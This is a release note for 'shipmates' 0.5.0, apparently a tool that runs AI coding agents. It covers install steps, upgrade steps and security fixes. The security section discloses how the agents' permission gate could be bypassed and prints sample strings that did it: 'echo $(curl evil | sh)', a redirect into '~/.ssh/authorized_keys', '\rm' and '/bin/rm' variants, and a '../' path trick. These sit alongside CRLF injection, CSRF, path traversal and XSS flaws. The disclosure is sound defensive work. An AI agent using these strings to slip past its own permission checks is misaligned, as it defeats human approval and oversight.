Voyages, the Brig, multi-runtime selection — and a security pass that changed
where several settings are allowed to live. **Read the upgrade steps first:**
this release deliberately breaks configurations that were unsafe, and some of
them fail closed at startup rather than warning.

## Installing

Download a prebuilt binary from the assets below — `shipmates_0.5.0_<os>_<arch>.tar.gz`
(macOS/Linux) or `.zip` (Windows). The persona catalog is embedded, so the single
executable is all you need.

```sh
tar -xzf shipmates_0.5.0_linux_amd64.tar.gz shipmates
sudo mv shipmates /usr/local/bin/
shipmates --version
```

`go install github.com/luthermonson/shipmates@v0.5.0` does **not** work this
release: shipmates pins a fork of `rancher/remotedialer` (carrying an unmerged
data-race fix) via a `replace` directive, and Go refuses to `go install` a module
with `replace` directives. Use a release binary or a source build
(`git clone` + `go build -o shipmates .`) until
[rancher/remotedialer#265](https://github.com/rancher/remotedialer/pull/265)
merges upstream.

## ⚠️ Upgrade steps

Work through these before restarting a ship or a fleet.

### 1. Persona execution config moves out of the checkout

`backend`, `command`, `cwd` and `dangerouslySkipPermissions` are no longer read
from a persona file (`.claude/agents/<persona>.md`) or from a `crew:` block in
`shipmates.yaml`. Both arrive with `git clone`, so on an unreviewed repository
they were attacker-controlled — and they decided which executable shipmates
spawned and whether a human approved it.

They now live in **`~/.shipmates/personas.yaml`** — the operator's own file,
outside every checkout — keyed by persona name:

```yaml
personas:
  aider:
    backend: command
    command: [aider, --model, gpt-5]
    cwd: /home/you/src/thing
```

If you run a command-backed mate (opencode, aider, …), move its config now.
Starting a persona whose checkout still asks for `backend:`/`command:` **fails
the spawn with an explicit error** rather than quietly launching claude instead.
Every refused key is logged with the file, the key, and where it must live.

`permissions.mode` stays repo-supplied but is bounded to `ask`, `acceptEdits`,
`plan`, `default` — an allowlist, so `bypassPermissions` and any mode invented
later are refused by default. No shipped catalog persona is affected.

### 2. The captain API now requires a credential

The ship's local HTTP server authenticates every route except `GET /health`.
The token is minted per run and written to `.shipmates/sessions/server.token`
(0600), alongside the port and pid files, which are now also 0600.

The CLI, `shipmates bridge`, the supervisor and the fleet were all updated. **If
you have your own script that curls the captain port, it must now send
`Authorization: Bearer <token>` read from that file.** Requests carrying an
`Origin` header or `Sec-Fetch-Site: cross-site` are refused outright, and
JSON endpoints require `Content-Type: application/json`.

### 3. A token-less fleet on a non-loopback address refuses to start

Previously an empty `SHIPMATES_FLEET_TOKEN` meant every request was allowed
through, logged as a single `auth=false` line. Combined with `--addr 0.0.0.0`
that exposed tells, PTY input and permission resolves to the network. Binding
anything other than loopback without a token is now a startup error.

### 4. Plaintext fleet URLs are refused

An `http://` or `ws://` fleet URL pointing at a non-loopback host is rejected —
it put the bearer token on the wire in cleartext and let a man in the middle
serve an empty deny list. **There is no opt-out flag.** Put TLS in front of the
fleet and use `https://`. `http://127.0.0.1:8443` and `localhost` remain legal
for local development.

### 5. Everyone re-logs-in to the fleet UI once

The session cookie now carries an HMAC-derived session id instead of the fleet's
shared secret. Existing cookies are not valid. If Fleet Command sits behind a
TLS-terminating proxy, set **`SHIPMATES_FLEET_TRUST_PROXY=1`** so
`X-Forwarded-Proto` is honoured and the cookie is marked `Secure` — without it
the fleet logs a warning and leaves the cookie unmarked, because blindly
trusting that header would let any client claim TLS.

### 6. `find` now prompts

`find` and `env` were removed from the auto-allowed read-only builtins: both
execute a program named in their own arguments (`find -exec`, `env CMD`), so
they could never be judged safe on the head token alone. If this is noisy for
you, add a narrowly scoped allow rule rather than putting them back.

## Security

A full review of the trust boundaries between a checkout, a ship, and the fleet.
Four high-severity issues, all fixed:

- **Arbitrary code execution from `git clone`.** A persona file in a checkout
  could name the executable to spawn and waive the permission gate. Enforcement
  is now structural — the repo-supplied structs have no fields for those
  settings, so there is nothing for a hostile file to decode into.
- **Request-line injection through the fleet proxy.** URL segments are
  percent-decoded by the router and were interpolated raw into a hand-built
  HTTP request to the captain, so a CR/LF in a persona name could rewrite the
  request and reach any captain endpoint. Segments are now validated and escaped,
  with a framing check as a backstop.
- **The captain API was unauthenticated and CSRF-able.** Loopback is not a
  permission: any local process could drive it, and any web page the operator
  visited could POST to it without a preflight. See upgrade step 2.
- **The permission gate could be bypassed with shell metacharacters.**
  `cat notes > ~/.ssh/authorized_keys` was auto-allowed with no prompt, because
  compound splitting ignored newlines and redirection and only the first token
  was inspected.

Also fixed, from the same review:

- **The fleet deny list failed open on restart.** The policy lived only in
  memory, so a ship booting while Fleet Command was unreachable ran every mate
  with no fleet-wide deny list at all — retrying only every five minutes, behind
  a single `WARN`. Policies now persist to a 0600 cache and are re-applied
  before the first fetch; running with no policy in force is an `ERROR` and
  retries every 15s.
- **Persona path traversal** on the captain's own handlers — an encoded `..`
  reached the filesystem helpers, giving arbitrary-location reads and a
  `.session` file write. Validated at every handler entry and inside the path
  helpers themselves.
- **XSS in the fleet UI** reachable from GitHub-derived bead text and from a
  ship's advertised repo URL, on the origin that holds the session secret.
- **Permission rules judged a spelling, not a command** — `echo $(curl evil | sh)`
  and `eval '…'` laundered past an allow rule, and `\rm`, `command rm`,
  `exec rm`, `/bin/rm` evaded a `Bash(rm *)` deny. Substitution bodies and
  `-c` scripts are now evaluated as their own command lines; deny matching
  normalises the head token. Path rules are cleaned before matching, so
  `.claude/foo/../settings.json` no longer evades a Brig article.
- **Secrets exposure**: the fleet token is no longer passed in the environment of
  a `curl`-capable model session, and `Bash(curl:*)` was dropped from it.
- Unbounded request bodies and an unbounded in-memory event log are now capped;
  session markers are 0600; ship-derived text is scrubbed of terminal escapes
  before being printed by the CLI.
- Reachable CVEs cleared by moving to Go 1.26.6 and `golang.org/x/net` v0.55.0.
  `govulncheck` reports **0 affected vulnerabilities**.

Keystroke logging (`SHIPMATES_BRIDGE_KEYLOG`) is opt-in and now documented,
including that it records everything typed, secrets included.

## Reliability

- **A process-teardown race could lose or retype a terminal event.** Both the
  claude and codex adapters used `cmd.StdoutPipe`/`StderrPipe` while the
  supervisor called `Wait` concurrently — the usage `os/exec` documents as
  incorrect. `Wait` closed the pipes as it reaped the child, discarding buffered
  output, so an auth failure (`Invalid API key · Please run /login`) could reach
  the operator as a bare exit code, or the payload could change type from
  `Terminal` to a string. Both packages now own their pipes and close them only
  after the readers finish.
- **A data race in the tunnel dialer** (`Session.pingCancel` / `connection.err`)
  could panic a ship under a reconnect storm. Fixed via the pinned
  `remotedialer` fork; the fix is upstream in
  [rancher/remotedialer#265](https://github.com/rancher/remotedialer/pull/265).

## Features

- **Voyages** — `plan`, `commission` and `sail`, with the `first-mate` persona,
  a model ladder, tracker integration and structured recovery.
- **The Brig** — fifteen Ship's Articles enforced in the permission kernel,
  with `freeze` / `release` and a denial log.
- **Multi-runtime** — `--runtime claude|codex|openai` across the command surface,
  with portable containment.
- **Hostile-input GitHub routing** — GitHub text is treated as data, not
  instructions; see [`docs/security.md`](../security.md).
